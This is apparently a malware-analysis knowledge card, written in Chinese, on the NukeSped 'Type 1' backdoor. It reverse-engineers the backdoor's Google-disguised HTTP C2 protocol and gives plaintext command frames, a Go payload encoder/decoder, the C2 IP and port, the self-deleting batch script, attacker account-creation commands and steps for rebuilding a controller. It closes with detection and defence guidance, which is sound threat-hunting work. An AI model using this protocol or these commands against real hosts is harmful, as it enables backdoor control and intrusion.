---
id: code-analysis-reverse-windows-nukesped-type1-secfetch-google-c2-rebuild
title: NukeSped 变体 Type 1 通信协议逆向与 C2 控制端重建：Sec-Fetch-* 头伪装 Google、指令 10/11/12/30/33/34/35、载荷 2-b 自反编码
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: nukesped-type1-secfetch-google-c2-protocol-rebuild
aliases:
- NukeSped Variant Type 1
- Sec-Fetch-Mode
- Sec-Fetch-User
- Sec-Fetch-Dest
- POST /login.php
- google 流量伪装
- NukeSped 控制端
- NukeSped 通信模型
tags:
- windows
- malware-analysis
- nukesped
- andariel
- lazarus
- apt
- rat
- c2
- protocol-reversing
- http-masquerade
- xor
- socket
- go
- threat-hunting
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V628
  verified_at: '2026-11-12T23:33:53+08:00'
  notes: 已对照原文全文与30张截图核对：AhnLab 59318报告原文/翻译（仅支持下载/执行/终止三命令）、上线包POST /login.php+Sec-Fetch-Mode/User/Dest、0xA1异或、decrypt注释27.102.114.215、htons(8000)、命令分发11/12/30/33/34、CreateProcessA+AssignProcessToJobObject+ResumeThread、ReadFile 10MB缓冲与1/1.5/3秒睡眠、SSE2 andnot+add/sub_epi8与尾部2-b、自删除bat+ShellExecuteA、Sleep(30000)重连与指令12后Sleep(3600000)均与截图一致。修正：原文只标注HASH（7699ba4eab5837a4ad9d5d6bbedffc18为32位十六进制，实为MD5），卡片误写SHA256，两处已改。图片30张全部读取，03/08/28降为1200px JPEG，07与09为同一张重复图（worker备注误写为05/09）。dedup top候选为NukeSped WinHTTP/sid/esep变体等，样本与协议不同，非同链。恶意样本无affected_versions。
---

## 一句话结论

AhnLab 2023-11 报告中被 Andariel 经 Apache ActiveMQ CVE-2023-46604 投递的 NukeSped“Variant – Type 1”样本，把 C2 通信伪装成访问 Google 的 HTTP 流量：上线是 `POST /login.php`、`Host: www.google.com`，用 `Sec-Fetch-Mode`（命令号）、`Sec-Fetch-User`（`S-<主机名>`）、`Sec-Fetch-Dest`（连接状态）承载协议字段；控制端以 `HTTP/1.1 200 OK` + `Sec-Fetch-Mode` + `Content-Length` + 加密载荷响应；命令为 10/11/12/30/33/34/35，载荷按字节做 `2 - b`（等价 `3 + ~b`）自反编码，字符串用 0xA1 异或加密。按此协议可用 Go 重建控制端，完成命令执行回显、管道写数据、进程终止、自删除与休眠。

## 原理

- **伪装思路**：样本直接手写 HTTP 报文并经 Winsock `send/recv` 与硬编码 IP 通信，`Host: www.google.com` 与 `Sec-Fetch-*` 都是浏览器真实会用的头名；若网络侧只按 Host/URL 判断而不校验实际连接 IP 与 DNS 解析，就会把这条外连当成正常 Google 流量。实际 C2 是加密存储在样本里的 IP（原文反编译注释可见 `27.102.114.215`），端口固定 8000（`htons(8000)`）。
- **字符串与 API 隐藏**：除 API 地址外的大量字符串（协议模板、IP、自删除脚本等）都按字节异或 `0xA1` 加密；运行前先解密，再用 `LoadLibraryA`/`GetProcAddress` 动态取 `htons/socket/inet_addr/WSAStartup/WSACleanup/ShellExecuteA/CreateFileA/GetModuleFileNameA/GetTempPathA/Sleep/CreateProcessA/CreatePipe/ReadFile/WriteFile` 等 API（`Shell32.dll`、`Ws2_32.dll`、`Kernel32.dll`），静态导入表几乎看不到敏感 API。
- **上线请求（后门 → 控制端）**：`POST /login.php HTTP/1.1`，`Host: www.google.com`，`Connection: keep-alive`，`Cache-Control: max-age=0`，`Sec-Fetch-Mode: 10`（10=初始连接），`Sec-Fetch-User: S-<主机名>`，`Sec-Fetch-Dest: 01`（01=初始连接状态）；主循环每 30 秒重连一次。
- **上线响应（控制端 → 后门）**：`HTTP/1.1 200 OK `，`Content-Type: text/html`，`Sec-Fetch-Mode: <命令号>`，`Content-Length: <载荷长度>`，空行后为加密载荷。后门解析 `Content-Length`（十进制转 hex 再转长度）后 `new` 出 `长度+2` 的缓冲区，`recv` 载荷并解密。
- **命令表**：10 初始连接（后门→控制端）；11 样本自删除；12 休眠 1 小时；30 向管道传输数据（后门侧也用于“命令执行成功”）；33 创建进程并返回回显；34 终止 33 运行的进程；35 命令执行失败（后门→控制端）。AhnLab 报告称新版本仅支持下载文件、执行命令、终止进程三个命令，原文实际逆向出 5 个远控指令（另有自删除与休眠）。
- **载荷编码**：对称且自反——加密 `out = 3 + ~b = 2 - b (mod 256)`，解密 `out = ~(b - 3) = 2 - b`，两方向是同一个逐字节函数；SSE2 实现用 `_mm_andnot_si128` + `_mm_add_epi8/_mm_sub_epi8`（`len >= 32` 走向量循环，尾部逐字节 `2 - b`）。回显与命令行都经此编码。
- **指令 33（执行命令）**：取 `Sec-Fetch-Mode` 与 `Content-Length` → 申请 `len+2` 内存 → 解密命令行 → `CreateProcessA` 创建进程，`AssignProcessToJobObject` 并 `ResumeThread`，另起线程用 `CreatePipe`+`ReadFile`（10MB 缓冲，按数据量睡眠 1/1.5/3 秒）读回显 → 用模板二组装 `GET http://www.google.com/search?q&cp=0&xssi=t&hl=en&authuser=1&nolsbt=1&dpr=1 HTTP/1.1` + `Sec-Fetch-Mode: 30` + `Content-Length: %08d` + 加密回显发回控制端。
- **指令 34**：`TerminateThread` 终止 33 的读管道线程，`CloseHandle` 关闭两组管道句柄，`TerminateProcess` 结束 33 的进程并释放缓冲区。
- **指令 30**：把解密后的数据（最长 0x207 字节）`memmove` 到 0x208 缓冲区，`WriteFile` 写入 33 进程的 `hWritePipe2`（cmd.exe 的 stdin），实现交互式向已启动进程输入。
- **指令 11**：结束通信循环，解密自删除脚本（`:RA`、`del /F "C:\Users\admin\Desktop\1.exe"`、`if exist ... goto RA`、`del /F "...\Temp\uninst.bat"`），`CreateFileA`/`WriteFile` 在 TEMP 释放 `uninst.bat` 后 `ShellExecuteA("open")` 运行。
- **指令 12**：返回码置 2，主循环在此后 `Sleep(3600000)` 休眠一小时再继续上线。
- **重建可行性**：协议无 TLS、无口令，字段全由监听端构造；与其完整逆向整只样本，不如用 Go 写最小控制端，通过“发命令—收响应”把每个编号与功能对应起来（原文已成功复现 whoami/net user/tasklist/ipconfig 等回显）。

## 触发条件

本卡是样本分析/威胁狩猎场景，不存在可主动触发的漏洞条件。适用前提：

- 拿到可疑 NukeSped 变体样本（MD5 `7699ba4eab5837a4ad9d5d6bbedffc18`，原文标注为 HASH）需要判定家族、还原协议；
- 或网络侧观察到“Host: www.google.com 的 `POST /login.php` / `GET /search?...`、`Sec-Fetch-Mode` 为数字命令、`Content-Length` 为 8 位数字、载荷不可读”的异常外连；
- 分析环境断网隔离，仅做静态/受控动态分析。

## 分析/重建步骤

1. 用 0xA1 异或解密字符串，提取协议模板、C2 IP、自删除脚本与 API 名（CyberChef XOR key `a1` 即可批量还原），定位 `LoadLibraryA`/`GetProcAddress` 动态解析逻辑。
2. 定位 Winsock 初始化与 `send/recv`：`htons(8000)`、`inet_addr(ip_addr)`；用 nc 监听 8000 抓上线包，确认 `Sec-Fetch-*` 字段含义。
3. 解析 `Content-Length` 的读取与 `new(len+2)` 分配逻辑，确认载荷长度与 `recv` 次数（两次：头、载荷）。
4. 从 `CryptBuf` 还原编解码：`2 - b` 自反函数；用任意语言实现 encode/decode。
5. 用 Go 实现控制端：监听端口 → 读上线包 → 按 `HTTP/1.1 200 OK` 模板回命令头 → 发送 `encode(cmd + 0x00)` → 读回显头与 `Content-Length` → 解出回显（GB18030 转 UTF-8 便于查看）。
6. 逐条命令验证 33/30/34/11/12，并记录协议映射用于检测规则。
7. 注意非阻塞 socket 时序：两次 `send` 之间需要延时（或调试器配合步过），否则样本第二次 `recv` 会早于载荷到达而失败（详见 [[code-analysis-dynamic-debugging-nonblocking-socket-second-recv-pacing]]）。

## PoC

协议帧（明文示例）：

```http
# 上线请求（后门 -> 控制端）
POST /login.php HTTP/1.1
Host: www.google.com
Connection: keep-alive
Cache-Control: max-age=0
Sec-Fetch-Mode: 10
Sec-Fetch-User: S-WIN-JMKXXXXX07
Sec-Fetch-Dest: 01

# 控制端下发命令 33（载荷为加密后的命令行）
HTTP/1.1 200 OK
Content-Type: text/html
Sec-Fetch-Mode: 33
Content-Length: 18

<18 字节加密载荷>

# 后门回传执行结果
GET http://www.google.com/search?q&cp=0&xssi=t&hl=en&authuser=1&nolsbt=1&dpr=1 HTTP/1.1
Sec-Fetch-Mode: 30
Content-Length: 00000023
Connection: keep-alive

<加密回显>
```

编解码（与样本等价的自反函数）：

```go
func encode(buffer []byte) []byte {
    output := make([]byte, len(buffer))
    for i := range buffer {
        output[i] = 3 + ^buffer[i] // 等价 2 - b
    }
    return output
}

func decode(buffer []byte) []byte {
    output := make([]byte, len(buffer))
    for i := range buffer {
        output[i] = ^(buffer[i] - 3) // 与 encode 相同，自反
    }
    return output
}
```

## 变体与关联

- 同家族不同变体：[[code-analysis-reverse-windows-nukesped-winhttp-sid-esep-c2]] 是 64 位 PE、WinHTTP 表单 POST（`sid`/`uid`/`esep` 参数）协议；本卡为 32 位变体 Type 1 的手写 HTTP + `Sec-Fetch-*` 伪装，二者样本哈希、协议与命令编号均不同，检测时应分别建模。
- 投递背景：AhnLab 报告称 Andariel 利用 Apache ActiveMQ CVE-2023-46604 投递该样本；攻击者常用 NukeSped 执行 `ipconfig /all`、`query user`、`net group "domain admins" /domain`、`net user _smuser <密码>`、`net localgroup administrators /add <账号>` 等命令做信息收集与建号。
- 方法学关联：[[code-analysis-reverse-windows-remcos-socket-protocol-controller-emulation]]（同类“协议逆向 + 自研控制端”思路）。

## 检测与防御

- **网络检测**：Host 为 `www.google.com` 但 TCP 目的 IP/DNS 并非 Google 的 HTTP 外连；`POST /login.php` 后紧跟 `HTTP/1.1 200 OK` 且带数字 `Sec-Fetch-Mode`；`GET /search?q&cp=0&xssi=t&hl=en&authuser=1&nolsbt=1&dpr=1` 且 `Content-Length` 为 `%08d` 形式；`Sec-Fetch-User` 以 `S-` 开头的主机名；载荷为不可读字节流。IOC：C2 `27.102.114.215:8000`，样本 MD5 `7699ba4eab5837a4ad9d5d6bbedffc18`（原文标注为 HASH）。
- **主机检测**：TEMP 目录出现 `uninst.bat` 且内容含 `:RA`、循环 `del` 自身；进程链中存在 cmd.exe 被远程拉起并通过管道读取输出；样本内大量 `0xA1` 异或后的 API 名字符串。
- **防御**：限制出站 8000 等非常规端口与 IP 直连；代理/DNS 日志做 Host 与目的 IP 一致性校验；EDR 监控 `CreatePipe`+`ReadFile` 读取子进程输出、`ShellExecuteA` 运行 TEMP 批处理；打 ActiveMQ CVE-2023-46604 补丁阻断投递入口；隔离网内用本协议重建控制端做蜜罐/检测验证。
